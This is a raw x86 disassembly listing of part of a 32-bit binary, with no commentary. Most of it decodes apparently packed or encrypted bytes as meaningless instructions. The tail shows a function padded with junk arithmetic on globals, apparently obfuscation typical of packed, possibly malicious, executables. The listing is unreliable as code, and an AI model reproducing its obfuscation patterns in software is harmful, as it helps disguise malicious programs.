  40dfd8:	in     al,dx
  40dfd9:	iret   
  40dfda:	rol    DWORD PTR [edx],0xb6
  40dfdd:	pop    esi
  40dfde:	sbb    ah,BYTE PTR [eax-0x357d660e]
  40dfe4:	(bad)
  40dfe7:	cmp    ecx,ebp
  40dfe9:	test   DWORD PTR [edx+0x60f6ae04],edx
  40dfef:	cmp    DWORD PTR [ecx-0x2f],ebx
  40dff2:	cmp    BYTE PTR [ebx-0x4d],bh
  40dff5:	daa    
  40dff6:	sub    edi,ebx
  40dff8:	or     al,BYTE PTR [edx-0x4e]
  40dffb:	cmp    DWORD PTR [esi-0x727e583a],ecx
  40e001:	addr16 mov esi,0x16f3c4fe
  40e007:	xchg   ebx,eax
  40e008:	jl     0x40dfa8
  40e00a:	repnz int 0x4e
  40e00d:	and    ebx,DWORD PTR [ebx-0x5a08c1eb]
  40e013:	pop    ss
  40e014:	sbb    bl,BYTE PTR [ebp+ebx*1-0x4147dccf]
  40e01b:	adc    dh,ch
  40e01d:	jns    0x40e016
  40e01f:	inc    esp
  40e020:	pop    ebx
  40e021:	(bad)  
  40e022:	jbe    0x40dfc3
  40e024:	gs cdq 
  40e026:	ss mov esp,0x5a7c332a
  40e02c:	cmc    
  40e02d:	dec    esi
  40e02e:	dec    esp
  40e02f:	dec    eax
  40e030:	xchg   esi,eax
  40e031:	mov    al,ds:0x28baeebc
  40e036:	fstp   TBYTE PTR [edi]
  40e038:	ins    DWORD PTR es:[edi],dx
  40e039:	push   esi
  40e03a:	sbb    ch,BYTE PTR [esi+0x49]
  40e03d:	push   cs
  40e03e:	jnp    0x40e006
  40e040:	jmp    0x8501:0xb8778bb1
  40e047:	in     al,0xc6
  40e049:	ins    DWORD PTR es:[edi],dx
  40e04a:	retf   0x18cf
  40e04d:	gs sub bh,BYTE PTR gs:[esi]
  40e051:	push   ebp
  40e052:	jmp    0x759b845f
  40e057:	int3   
  40e058:	(bad)  
  40e059:	call   0x6ea4:0x4fe6fe8f
  40e060:	adc    BYTE PTR [edx-0x763b652e],bh
  40e066:	sar    ecx,0x37
  40e069:	iret   
  40e06a:	lods   al,BYTE PTR ds:[esi]
  40e06b:	lea    esi,[ecx]
  40e06d:	test   DWORD PTR [esi+0x2b],esi
  40e070:	fucom  st(5)
  40e072:	push   0xffffffbd
  40e074:	pop    es
  40e075:	xor    DWORD PTR [eax+ebx*8-0x24],0xffffffcd
  40e07a:	cmc    
  40e07b:	sbb    dl,bh
  40e07d:	cmp    BYTE PTR [ebx-0x5c],bl
  40e080:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40e081:	in     eax,dx
  40e082:	out    dx,eax
  40e083:	mov    fs,WORD PTR [ebp+0x7de7426e]
  40e089:	lods   eax,DWORD PTR ds:[esi]
  40e08a:	int3   
  40e08b:	inc    esi
  40e08c:	stos   DWORD PTR es:[edi],eax
  40e08d:	(bad)  
  40e08e:	mov    dh,0x75
  40e090:	neg    BYTE PTR [eax-0x7373e1e]
  40e096:	je     0x40e087
  40e098:	(bad)  
  40e099:	outs   dx,DWORD PTR ds:[esi]
  40e09a:	ret    
  40e09b:	adc    ebx,DWORD PTR [eax-0x3]
  40e09e:	push   es
  40e09f:	dec    ebp
  40e0a0:	sbb    ebx,DWORD PTR [esi+0x68]
  40e0a3:	stos   DWORD PTR es:[edi],eax
  40e0a4:	xor    DWORD PTR [edx-0x1696714a],esi
  40e0aa:	jmp    0xc7cbabf5
  40e0af:	add    al,0x56
  40e0b1:	retf   
  40e0b2:	pop    edi
  40e0b3:	lahf   
  40e0b4:	and    edi,ebx
  40e0b6:	inc    edx
  40e0b7:	cmp    eax,0x3d8fb235
  40e0bc:	add    ebp,DWORD PTR [esi+0x19159f1]
  40e0c2:	daa    
  40e0c3:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40e0c4:	daa    
  40e0c5:	stc    
  40e0c6:	mov    cl,0x23
  40e0c8:	(bad)  
  40e0ca:	jnp    0x40e0e3
  40e0cc:	or     al,0x7
  40e0ce:	cmp    bh,0xba
  40e0d1:	push   edi
  40e0d2:	out    dx,al
  40e0d3:	jne    0x40e142
  40e0d5:	mov    eax,0x4abdff99
  40e0da:	cwde   
  40e0db:	jg     0x40e080
  40e0dd:	cmp    DWORD PTR [eax+0x3a],esp
  40e0e0:	imul   esp,DWORD PTR [ebx+0x6c],0x14
  40e0e4:	jne    0x40e108
  40e0e6:	or     eax,0xc12db96d
  40e0eb:	adc    bl,ch
  40e0ed:	ins    DWORD PTR es:[edi],dx
  40e0ee:	jns    0x40e12b
  40e0f0:	or     dl,BYTE PTR [ebp+0x14c776d3]
  40e0f6:	adc    edx,ebp
  40e0f8:	jno    0x40e080
  40e0fa:	mov    al,ds:0x53cf933
  40e0ff:	xor    DWORD PTR [ecx],eax
  40e101:	and    esp,DWORD PTR [edi-0x15]
  40e104:	pop    edx
  40e105:	call   0xb54ee4d7
  40e10a:	xchg   dh,ah
  40e10c:	adc    ebx,DWORD PTR [esi]
  40e10e:	pop    esp
  40e10f:	and    eax,0x398e231
  40e114:	sub    al,0x74
  40e116:	call   0xafc59532
  40e11b:	and    dh,BYTE PTR [esi+0x47ccc1f8]
  40e121:	call   0x7f5a:0x7fbbcc14
  40e128:	mov    DWORD PTR [ecx+0x61],0xaf198adc
  40e12f:	ins    DWORD PTR es:[edi],dx
  40e130:	dec    eax
  40e131:	in     al,dx
  40e132:	xchg   edx,eax
  40e133:	cmp    DWORD PTR [ebx],eax
  40e135:	jne    0x40e15f
  40e137:	push   ebx
  40e138:	fcomp  DWORD PTR [edi-0x5efd2699]
  40e13e:	jecxz  0x40e0e7
  40e140:	cmp    edx,DWORD PTR [ecx]
  40e142:	xor    DWORD PTR [edx+ebp*8],0xffffffde
  40e146:	xor    DWORD PTR [edi+edx*1-0x24956092],esp
  40e14d:	in     eax,dx
  40e14e:	cs popa 
  40e150:	mov    bl,dh
  40e152:	mov    al,0x6e
  40e154:	rcl    eax,0x84
  40e157:	push   ss
  40e158:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40e159:	es scas al,BYTE PTR es:[edi]
  40e15b:	or     eax,0x3c062bc3
  40e160:	push   eax
  40e161:	pusha  
  40e162:	jo     0x40e1c3
  40e164:	xchg   DWORD PTR [ebx],esi
  40e166:	jecxz  0x40e12c
  40e168:	hlt    
  40e169:	push   ss
  40e16a:	lods   al,BYTE PTR ds:[esi]
  40e16b:	mov    ?,WORD PTR [esi-0xfa0a152]
  40e171:	jg     0x40e0f6
  40e173:	scas   eax,DWORD PTR es:[edi]
  40e174:	and    BYTE PTR [edx],bl
  40e176:	cli    
  40e177:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40e178:	cli    
  40e179:	repnz test BYTE PTR [edi+0x7fca752f],bl
  40e180:	fdivrp st(2),st
  40e182:	or     ah,BYTE PTR [eax+0x75]
  40e185:	imul   ecx,DWORD PTR [eax+0x436a8ea3],0xffffffe1
  40e18c:	arpl   bp,bx
  40e18e:	in     eax,dx
  40e18f:	xor    al,0x5e
  40e191:	popf   
  40e192:	mov    ds,ecx
  40e194:	ret    
  40e195:	repz lock xchg ebx,eax
  40e198:	xchg   ecx,eax
  40e199:	outs   dx,BYTE PTR ds:[esi]
  40e19a:	rol    BYTE PTR [ecx-0x56a9831a],0xb
  40e1a1:	mov    DWORD PTR [ecx+edx*2+0x3c],esi
  40e1a5:	cld    
  40e1a6:	dec    ebp
  40e1a7:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40e1a8:	mov    bl,0xa1
  40e1aa:	hlt    
  40e1ab:	sub    edx,DWORD PTR [eax-0x29]
  40e1ae:	mov    eax,ds:0x1aab135a
  40e1b3:	lea    ebp,[edx-0x618b30e8]
  40e1b9:	repz ror DWORD PTR [ebp-0x15],0x13
  40e1be:	aam    0xb1
  40e1c0:	mov    dh,0x82
  40e1c2:	mul    DWORD PTR [edx+0x10692e99]
  40e1c8:	jecxz  0x40e186
  40e1ca:	jmp    0xe1f90b7d
  40e1cf:	mov    al,0x9e
  40e1d1:	push   esp
  40e1d2:	and    BYTE PTR [bx+si-0x68],al
  40e1d6:	imul   ecx,edx,0x3152f0a5
  40e1dc:	cmp    esi,DWORD PTR [edi]
  40e1de:	scas   al,BYTE PTR es:[edi]
  40e1df:	ja     0x40e1a0
  40e1e1:	fld    QWORD PTR [ebx]
  40e1e3:	bound  ebp,QWORD PTR [edi]
  40e1e5:	pop    ecx
  40e1e6:	iret   
  40e1e7:	pop    ebp
  40e1e8:	pop    esp
  40e1e9:	es xchg ebp,eax
  40e1eb:	inc    eax
  40e1ec:	cmp    BYTE PTR [ebx],al
  40e1ee:	jge    0x40e1a9
  40e1f0:	inc    esi
  40e1f1:	and    BYTE PTR [esi+0x37b99671],0xfe
  40e1f8:	test   al,0x50
  40e1fa:	stos   BYTE PTR es:[edi],al
  40e1fb:	cmc    
  40e1fc:	shr    DWORD PTR [ecx],cl
  40e1fe:	mov    cl,BYTE PTR [edi]
  40e200:	imul   esp,edx,0x6
  40e203:	mov    edi,esp
  40e205:	repz pusha 
  40e207:	or     eax,eax
  40e209:	add    bl,BYTE PTR [edi+0x75]
  40e20c:	mov    ebx,0xb7dc1102
  40e211:	add    edi,DWORD PTR [ebp-0x28e1eb99]
  40e217:	add    bh,BYTE PTR [ebx]
  40e219:	dec    ebp
  40e21a:	sar    esp,0xcd
  40e21d:	clc    
  40e21e:	loop   0x40e1e2
  40e220:	cmp    al,0x10
  40e222:	mov    edx,esi
  40e224:	sti    
  40e225:	aas    
  40e226:	lea    esp,[edi-0x3ad36db5]
  40e22c:	xor    al,0x76
  40e22e:	(bad)  
  40e22f:	loopne 0x40e25a
  40e231:	cmp    al,0x69
  40e233:	sub    ch,bl
  40e235:	iret   
  40e236:	xchg   ebp,eax
  40e237:	or     dl,bh
  40e239:	test   eax,0xc8dffd83
  40e23e:	xor    edi,edx
  40e240:	sub    eax,0xedeb8b7c
  40e245:	arpl   WORD PTR [edx+0x7a],sp
  40e248:	mov    edx,edx
  40e24a:	lahf   
  40e24b:	in     eax,0x8f
  40e24d:	js     0x40e1da
  40e24f:	rcl    DWORD PTR [edx+0x4e9ac74b],cl
  40e255:	out    dx,eax
  40e256:	retf   0xb0d7
  40e259:	mov    eax,0x5ff0a518
  40e25e:	scas   eax,DWORD PTR es:[edi]
  40e25f:	dec    esp
  40e260:	adc    BYTE PTR [edi-0x58],al
  40e263:	enter  0xff5f,0x73
  40e267:	popa   
  40e268:	jno    0x40e20f
  40e26a:	push   ss
  40e26b:	xchg   esi,eax
  40e26c:	into   
  40e26d:	dec    ecx
  40e26e:	or     bh,ah
  40e270:	lods   al,BYTE PTR ds:[esi]
  40e271:	fcomp  DWORD PTR [ebx-0x76cb070e]
  40e277:	and    BYTE PTR [esi],dh
  40e279:	dec    ebp
  40e27a:	aaa    
  40e27b:	push   ss
  40e27c:	test   al,0x6f
  40e27e:	out    0x38,al
  40e280:	xor    al,0x84
  40e282:	cmp    ecx,DWORD PTR [ebx-0x5c]
  40e285:	jb     0x40e28d
  40e287:	out    0x31,al
  40e289:	cmp    ebp,ebx
  40e28b:	call   0x62c41940
  40e290:	adc    edi,eax
  40e292:	inc    ebx
  40e293:	daa    
  40e294:	in     al,0xd5
  40e296:	aaa    
  40e297:	sub    edi,edx
  40e299:	add    edi,DWORD PTR [ebp-0x10]
  40e29c:	mov    edx,DWORD PTR [ebp-0x20]
  40e29f:	mov    ebx,DWORD PTR [ebp-0x8]
  40e2a2:	xor    edx,eax
  40e2a4:	add    edx,ecx
  40e2a6:	imul   edx,ebx
  40e2a9:	cmp    edx,edi
  40e2ab:	jbe    0x40a4fb
  40e2b1:	pop    ebx
  40e2b2:	jmp    0x40e6c9
  40e2b7:	mov    BYTE PTR [edi+0x6af53ecb],bl
  40e2bd:	xchg   ebp,eax
  40e2be:	imul   esp,ecx,0x2d5e5ddc
  40e2c4:	js     0x7eeb1151
  40e2ca:	jle    0x40e33c
  40e2cc:	jns    0x40e34c
  40e2ce:	jle    0x40e25b
  40e2d0:	les    ebx,FWORD PTR [edi]
  40e2d2:	sahf   
  40e2d3:	fld    TBYTE PTR [eax]
  40e2d5:	loop   0x40e270
  40e2d7:	inc    esp
  40e2d8:	xchg   ebx,eax
  40e2d9:	add    BYTE PTR [ebx+0x237ba1df],ch
  40e2df:	xchg   esp,eax
  40e2e0:	pop    ecx
  40e2e1:	jle    0x40e348
  40e2e3:	dec    esi
  40e2e4:	jl     0x40e35f
  40e2e6:	int    0x28
  40e2e8:	popf   
  40e2e9:	mov    ecx,0xdc65e1f
  40e2ee:	sbb    DWORD PTR [ecx-0x2a],ebx
  40e2f1:	es pushf 
  40e2f3:	pushf  
  40e2f4:	in     al,0xf8
  40e2f6:	aas    
  40e2f7:	scas   eax,DWORD PTR es:[edi]
  40e2f8:	sbb    ebp,DWORD PTR [ecx+0x322bc46b]
  40e2fe:	add    al,0x43
  40e300:	pushf  
  40e301:	cwde   
  40e302:	fcomp  st(4)
  40e304:	out    0xe6,eax
  40e306:	mov    ecx,0xa37221bc
  40e30b:	dec    edi
  40e30d:	push   ecx
  40e30e:	repnz add DWORD PTR [eax+0x64],0x4b
  40e313:	xchg   ebp,eax
  40e314:	mov    dh,0xc9
  40e316:	mov    esp,DWORD PTR [esi]
  40e318:	rol    BYTE PTR [edi+0x2361a4bf],1
  40e31e:	mov    eax,ds:0x3b0035ad
  40e323:	sbb    BYTE PTR [ecx+0x7087c43],bl
  40e329:	sbb    al,0xf6
  40e32b:	inc    ecx
  40e32c:	lock sti 
  40e32e:	dec    ecx
  40e32f:	push   edi
  40e330:	icebp  
  40e331:	push   edx
  40e332:	aaa    
  40e333:	(bad)  
  40e334:	hlt    
  40e335:	xor    ecx,DWORD PTR [ebx-0x69]
  40e338:	sbb    eax,0xcf3724c2
  40e33d:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40e33e:	test   edi,esp
  40e340:	sar    BYTE PTR [ebp+0x75],0xd3
  40e344:	jae    0x40e385
  40e346:	daa    
  40e347:	test   BYTE PTR [bp+di-0x6a54],0x66
  40e34d:	call   0x294b:0xca677663
  40e354:	je     0x40e312
  40e356:	or     eax,0x9207be90
  40e35b:	sub    eax,0x5c7aa434
  40e360:	jp     0x40e34f
  40e362:	sub    eax,0x4aab14fd
  40e367:	ret    
  40e368:	jmp    DWORD PTR [edx]
  40e36a:	pop    edi
  40e36b:	inc    ebx
  40e36c:	sub    DWORD PTR [ebx+0x751adba2],edi
  40e372:	in     eax,0xed
  40e374:	mov    al,ds:0x3074ab90
  40e379:	stc    
  40e37a:	jae    0x40e37b
  40e37c:	mov    dh,0x91
  40e37e:	mov    dl,0x56
  40e380:	outs   dx,BYTE PTR ds:[esi]
  40e381:	xchg   ebx,eax
  40e382:	or     cl,cl
  40e384:	fnstenv [ebp+0x55]
  40e387:	cmp    al,ah
  40e389:	add    DWORD PTR [edx],eax
  40e38b:	ss loope 0x40e3a8
  40e38e:	in     eax,dx
  40e38f:	mov    bl,0x6b
  40e391:	mov    edx,0xdf887c54
  40e396:	jge    0x40e38f
  40e398:	cmps   DWORD PTR ss:[esi],DWORD PTR es:[edi]
  40e39a:	xor    eax,ebp
  40e39c:	sub    BYTE PTR [esi],0x6a
  40e39f:	lds    edi,FWORD PTR [ebp+0x5d]
  40e3a2:	adc    eax,DWORD PTR [ebx]
  40e3a4:	ds push eax
  40e3a6:	xor    al,0x30
  40e3a8:	je     0x40e364
  40e3aa:	push   edx
  40e3ab:	test   BYTE PTR [edx],0x4b
  40e3ae:	xor    eax,DWORD PTR [ebp+0x1]
  40e3b1:	pop    es
  40e3b2:	sbb    al,0x4b
  40e3b4:	pop    ebp
  40e3b5:	pop    ss
  40e3b6:	or     al,0x16
  40e3b8:	rcl    BYTE PTR [edx+0x53],0x93
  40e3bc:	int3   
  40e3bd:	push   esi
  40e3be:	cmp    dh,BYTE PTR [ebx-0x3755e260]
  40e3c4:	add    esi,DWORD PTR [ecx+0x67e1d9ae]
  40e3ca:	leave  
  40e3cb:	cmp    al,BYTE PTR [edi+0x14]
  40e3ce:	mov    BYTE PTR [ecx-0x65],0xce
  40e3d2:	sub    BYTE PTR [edx+0x3b],dh
  40e3d5:	les    ebx,FWORD PTR [esi+0x33]
  40e3d8:	sub    eax,DWORD PTR [ebp-0x57]
  40e3db:	repnz lods eax,DWORD PTR ds:[esi]
  40e3dd:	les    ecx,FWORD PTR [esi]
  40e3df:	lods   eax,DWORD PTR ds:[esi]
  40e3e0:	sbb    ah,0x72
  40e3e3:	lahf   
  40e3e4:	retf   
  40e3e5:	mov    al,0x45
  40e3e7:	(bad)  [edi-0x12]
  40e3ea:	sub    eax,0x209d05f3
  40e3ef:	imul   esp,DWORD PTR [edx+0x47],0x3d020e43
  40e3f6:	imul   edi,DWORD PTR [ecx+0x5957ccce],0x67
  40e3fd:	fisubr WORD PTR [ebp+esi*8-0x30]
  40e401:	jns    0x40e432
  40e403:	and    BYTE PTR [ecx-0x702a9246],ch
  40e409:	in     eax,dx
  40e40a:	cmp    al,bh
  40e40c:	fistp  QWORD PTR [ecx-0x198ce52b]
  40e412:	std    
  40e413:	(bad)
  40e416:	outs   dx,BYTE PTR ds:[esi]
  40e417:	adc    esp,ebx
  40e419:	stos   DWORD PTR es:[edi],eax
  40e41a:	jo     0x40e3af
  40e41c:	pop    ebp
  40e41d:	xchg   esp,eax
  40e41e:	stos   DWORD PTR es:[edi],eax
  40e41f:	aad    0x46
  40e421:	ror    BYTE PTR [edx+0x6c],cl
  40e424:	cmp    eax,DWORD PTR [ebp+0x25]
  40e427:	aad    0x43
  40e429:	jecxz  0x40e43a
  40e42b:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40e42c:	adc    esi,DWORD PTR [edi+0x168b045b]
  40e432:	retf   0x6b4f
  40e435:	out    dx,al
  40e436:	enter  0x3abe,0x89
  40e43a:	lock xchg esi,eax
  40e43c:	fcomi  st,st(6)
  40e43e:	loop   0x40e44b
  40e440:	bound  ecx,QWORD PTR [edi*4+0x20ec05bf]
  40e447:	mov    bh,0xa4
  40e449:	and    esp,DWORD PTR [ecx-0x5d]
  40e44c:	mov    esp,0xc28b4615
  40e451:	mov    edx,0x8fd03faf
  40e456:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40e457:	xor    eax,0xedb529b3
  40e45c:	in     al,dx
  40e45d:	shl    DWORD PTR [ecx],cl
  40e45f:	into   
  40e460:	sbb    al,ch
  40e462:	and    eax,0xabd0a7d6
  40e467:	mov    eax,ds:0x28792687
  40e46c:	and    dl,BYTE PTR [eax+0x1ad0fdc4]
  40e472:	jnp    0x40e47b
  40e474:	loope  0x40e438
  40e476:	scas   eax,DWORD PTR es:[edi]
  40e477:	icebp  
  40e478:	cmp    BYTE PTR [ecx+0x7],bl
  40e47b:	inc    esp
  40e47c:	stos   BYTE PTR es:[edi],al
  40e47d:	test   esi,edx
  40e47f:	sub    bl,dl
  40e481:	or     DWORD PTR [edi],edi
  40e483:	push   es
  40e484:	pop    edx
  40e485:	jb     0x40e455
  40e487:	sahf   
  40e488:	sub    eax,0x24acd248
  40e48d:	inc    edi
  40e48e:	xchg   ebp,eax
  40e48f:	syscall 
  40e491:	imul   esi,DWORD PTR [eax+0x76],0x4a1eed2a
  40e498:	fsubr  QWORD PTR [ebp+0x62]
  40e49b:	mov    al,ds:0x40f7332f
  40e4a0:	xor    bh,BYTE PTR [ebx-0x15]
  40e4a3:	sub    BYTE PTR [edi-0x5ce1bd72],0x0
  40e4aa:	inc    edi
  40e4ab:	in     al,0xf8
  40e4ad:	sbb    ch,BYTE PTR [ecx+0x1a]
  40e4b0:	fbstp  TBYTE PTR [edx-0x7f34db43]
  40e4b6:	add    ah,BYTE PTR [ebx+esi*1-0x18bedcc9]
  40e4bd:	addr16 sub eax,0x1bc6e63e
  40e4c3:	inc    esp
  40e4c4:	pushf  
  40e4c5:	jle    0x40e4d5
  40e4c7:	int    0xc6
  40e4c9:	pop    ebp
  40e4ca:	fs or  eax,0x43d5e83f
  40e4d0:	repnz loopne 0x40e523
  40e4d3:	sbb    ebx,esp
  40e4d5:	fidivr WORD PTR [esi*8+0x5103b880]
  40e4dc:	sar    BYTE PTR [ecx+0xe6751d2],1
  40e4e2:	jg     0x40e51b
  40e4e4:	cmp    al,0xcc
  40e4e6:	jae    0x40e4db
  40e4e8:	dec    edi
  40e4e9:	xchg   ebx,eax
  40e4ea:	push   0xfffffff3
  40e4ec:	fnstenv [eax-0x78d79028]
  40e4f2:	ror    esp,cl
  40e4f4:	sub    esi,ebx
  40e4f6:	jno    0x40e4ad
  40e4f8:	lods   al,BYTE PTR ds:[esi]
  40e4f9:	push   edx
  40e4fa:	or     esp,DWORD PTR [esp+edi*4+0x4c]
  40e4fe:	dec    edi
  40e4ff:	(bad)  
  40e501:	or     edx,ecx
  40e503:	add    DWORD PTR gs:[eax],ecx
  40e506:	into   
  40e507:	or     DWORD PTR [esi],ebx
  40e509:	jbe    0x40e4d3
  40e50b:	in     al,0x3d
  40e50d:	adc    al,0x82
  40e50f:	add    cl,BYTE PTR [esi+0x7a]
  40e512:	jmp    DWORD PTR [edx-0x2b]
  40e515:	in     eax,dx
  40e516:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40e517:	imul   eax,DWORD PTR [edx-0x2294f2a5],0x3b
  40e51e:	(bad)  [ecx+edx*4-0x7c]
  40e522:	push   cs
  40e523:	enter  0x5d68,0x50
  40e527:	es sbb eax,0x92a55cf2
  40e52d:	(bad)  
  40e52e:	in     eax,dx
  40e52f:	int3   
  40e530:	lock mov ebx,0x50de022f
  40e536:	sbb    al,0x1
  40e538:	out    dx,al
  40e539:	jmp    0xefc76489
  40e53e:	test   al,0x4c
  40e540:	pop    ds
  40e541:	mov    cl,0x6d
  40e543:	sar    BYTE PTR [esi+0x46af3ee1],1
  40e549:	mov    DWORD PTR [ebp+0x78],esp
  40e54c:	dec    esi
  40e54d:	sub    BYTE PTR [ebx-0x5343cb2],dl
  40e553:	aad    0x91
  40e555:	mov    eax,0x59e9249e
  40e55a:	out    dx,eax
  40e55b:	jmp    0xe9d1f8ca
  40e560:	sar    BYTE PTR [esi-0x24],cl
  40e563:	rol    DWORD PTR [eax],1
  40e565:	sub    ah,bh
  40e567:	cmp    dh,BYTE PTR [eax]
  40e569:	push   ecx
  40e56a:	jl     0x40e5a7
  40e56c:	xchg   esp,eax
  40e56d:	sbb    al,0x0
  40e56f:	add    cl,BYTE PTR [edx]
  40e571:	mov    al,ds:0xcd65bdd7
  40e576:	daa    
  40e577:	mov    WORD PTR [edx],es
  40e579:	retf   0x5a8e
  40e57c:	push   edi
  40e57d:	sub    BYTE PTR [ebx+ebx*4-0x7a],cl
  40e581:	iret   
  40e582:	repnz into 
  40e584:	xchg   DWORD PTR [ecx+edx*8],edx
  40e587:	pop    eax
  40e588:	inc    eax
  40e589:	addr16 (bad) 
  40e58c:	test   eax,0x9efbb7a2
  40e591:	into   
  40e592:	mov    ah,0xa5
  40e594:	fiadd  DWORD PTR [edx]
  40e596:	xchg   BYTE PTR [esi],al
  40e598:	jle    0x40e5d9
  40e59a:	adc    ecx,DWORD PTR [ebx+ebp*8+0x14709074]
  40e5a1:	pop    ds
  40e5a2:	cwde   
  40e5a3:	or     ecx,esp
  40e5a5:	call   0xc97a:0x82728be5
  40e5ac:	fcom   QWORD PTR [eax+0x74]
  40e5af:	inc    ecx
  40e5b0:	add    esi,DWORD PTR [eax-0x1a43b8d5]
  40e5b6:	cmp    DWORD PTR [edx],edi
  40e5b8:	scas   al,BYTE PTR es:[edi]
  40e5b9:	cwde   
  40e5ba:	sti    
  40e5bb:	and    ch,cl
  40e5bd:	ins    BYTE PTR es:[edi],dx
  40e5be:	pop    ss
  40e5bf:	aad    0x31
  40e5c1:	outs   dx,BYTE PTR ds:[esi]
  40e5c2:	mov    edi,0x56e60ced
  40e5c7:	cmp    al,0x1d
  40e5c9:	add    al,0x99
  40e5cb:	xor    eax,0x5b4d6327
  40e5d0:	retf   
  40e5d1:	mov    cl,0x4
  40e5d3:	cmp    ebp,DWORD PTR [ebp-0x2046754f]
  40e5d9:	xchg   DWORD PTR [esi],ebx
  40e5db:	xor    al,0x18
  40e5dd:	fucomi st,st(7)
  40e5df:	sti    
  40e5e0:	cmp    dl,ah
  40e5e2:	mov    ebx,0x903f1d5c
  40e5e7:	xor    al,0x78
  40e5e9:	mov    esp,DWORD PTR [eax-0x1e2c8005]
  40e5ef:	dec    cl
  40e5f1:	jo     0x40e5cb
  40e5f3:	push   ds
  40e5f4:	(bad)  
  40e5f5:	lock loopne 0x40e5ec
  40e5f8:	fs jmp 0x6888b7d5
  40e5fe:	clc    
  40e5ff:	test   BYTE PTR [ecx],dh
  40e601:	mov    dl,0xd0
  40e603:	lods   al,BYTE PTR ds:[esi]
  40e604:	xor    BYTE PTR [edx-0x52],ah
  40e607:	mov    ebx,0xec11be29
  40e60c:	test   DWORD PTR [esi-0x6c601e18],edx
  40e612:	mov    ecx,0xd146579d
  40e617:	fstp   DWORD PTR fs:[ebx]
  40e61a:	dec    edx
  40e61b:	mov    eax,ds:0x8c2003d1
  40e620:	and    eax,0xe8ab980b
  40e625:	ins    BYTE PTR es:[edi],dx
  40e626:	std    
  40e627:	push   es
  40e628:	dec    esp
  40e629:	cmp    DWORD PTR [ebx-0x4ab2477f],ebp
  40e62f:	call   0x5b01:0x33fc379c
  40e636:	inc    BYTE PTR [edi]
  40e638:	imul   esp,DWORD PTR [ebp+0xf710475],0x41916c20
  40e642:	(bad)  
  40e643:	dec    ecx
  40e644:	push   ecx
  40e645:	out    dx,al
  40e646:	imul   ecx,DWORD PTR [ebx+esi*2+0x1990a786],0xf
  40e64e:	repz xor BYTE PTR [esi-0x21fa38f4],0xce
  40e656:	stos   DWORD PTR es:[edi],eax
  40e657:	push   edx
  40e658:	std    
  40e659:	add    dh,cl
  40e65b:	pop    esi
  40e65c:	jecxz  0x40e6c4
  40e65e:	or     ecx,DWORD PTR [edi-0xe]
  40e661:	dec    ebx
  40e662:	pop    edi
  40e663:	ins    DWORD PTR es:[edi],dx
  40e664:	inc    edi
  40e665:	in     al,0xcf
  40e667:	pop    ebx
  40e668:	jge    0x40e678
  40e66a:	sub    DWORD PTR [edi+0x67],ebx
  40e66d:	es int 0xda
  40e670:	push   ds
  40e671:	xchg   esi,eax
  40e672:	loopne 0x40e64a
  40e674:	in     al,0x48
  40e676:	mov    esi,0x44914530
  40e67b:	dec    edi
  40e67c:	pop    ss
  40e67d:	or     eax,0x84b51f98
  40e682:	dec    edi
  40e683:	sbb    al,bh
  40e685:	jl     0x40e62b
  40e687:	adc    edi,edx
  40e689:	inc    edx
  40e68a:	jb     0x40e64d
  40e68c:	push   0xffffffde
  40e68e:	stc    
  40e68f:	outs   dx,DWORD PTR ds:[esi]
  40e690:	or     BYTE PTR [edi+0x53a9ff3d],ch
  40e696:	xchg   BYTE PTR [esi-0x3928efd3],ah
  40e69c:	and    DWORD PTR [edx],eax
  40e69e:	pop    es
  40e69f:	iret   
  40e6a0:	add    bh,BYTE PTR [edx-0x79]
  40e6a3:	nop
  40e6a4:	mov    cl,0x92
  40e6a6:	fcmovnu st,st(4)
  40e6a8:	mov    edx,0xec03dc4f
  40e6ad:	stos   BYTE PTR es:[edi],al
  40e6ae:	push   es
  40e6af:	xchg   edi,eax
  40e6b0:	jle    0x40e672
  40e6b2:	sar    BYTE PTR [ebx],cl
  40e6b4:	push   es
  40e6b5:	xor    BYTE PTR [edx-0x30],0x18
  40e6b9:	(bad)  
  40e6bb:	mov    ebp,0xe6fedb33
  40e6c0:	(bad)  [ebp-0x42]
  40e6c3:	pop    ecx
  40e6c4:	fimul  DWORD PTR [ecx]
  40e6c6:	xchg   esi,eax
  40e6c7:	jge    0x40e690
  40e6c9:	pop    edi
  40e6ca:	leave  
  40e6cb:	ret    0x8
  40e6ce:	push   ebp
  40e6cf:	mov    ebp,esp
  40e6d1:	sub    esp,0xa8
  40e6d7:	sbb    DWORD PTR ds:0x434613,0x1bda
  40e6e1:	push   ebx
  40e6e2:	sbb    DWORD PTR ds:0x4345c3,0x5a23
  40e6ec:	push   esi
  40e6ed:	inc    DWORD PTR ds:0x434547
  40e6f3:	push   edi
  40e6f4:	and    DWORD PTR ds:0x43453b,0x6624
  40e6fe:	push   0x414c56
  40e703:	adc    DWORD PTR ds:0x434503,0x6b43
  40e70d:	call   DWORD PTR ds:0x41340c
  40e713:	test   eax,eax
  40e715:	mov    DWORD PTR ds:0x434537,0x267
  40e71f:	je     0x40e741
  40e725:	adc    DWORD PTR ds:0x4345c7,0x4344df
  40e72f:	xor    eax,eax
  40e731:	inc    eax
  40e732:	mov    DWORD PTR ds:0x4344eb,0x5274
  40e73c:	jmp    0x40f150
  40e741:	add    DWORD PTR ds:0x43453b,ecx
  40e747:	mov    DWORD PTR [ebp-0x24],0xf89c8536
  40e74e:	and    DWORD PTR ds:0x4345d3,0x0
  40e758:	jmp    0x40e76a
  40e75d:	mov    edi,DWORD PTR ds:0x4345d3
  40e763:	inc    edi
  40e764:	mov    DWORD PTR ds:0x4345d3,edi
  40e76a:	cmp    DWORD PTR ds:0x4345d3,0x16
  40e771:	jae    0x40e855
  40e777:	cmp    DWORD PTR ds:0x4345d3,0xd
  40e77e:	jne    0x40e79e
  40e784:	push   0x4344eb
  40e789:	push   0x6202
  40e78e:	push   0x434688
  40e793:	push   0x434771
  40e798:	call   DWORD PTR ds:0x413344
  40e79e:	cmp    DWORD PTR ds:0x4345d3,0xc
  40e7a5:	jne    0x40e7b8
  40e7ab:	mov    edi,DWORD PTR ds:0x4345d3
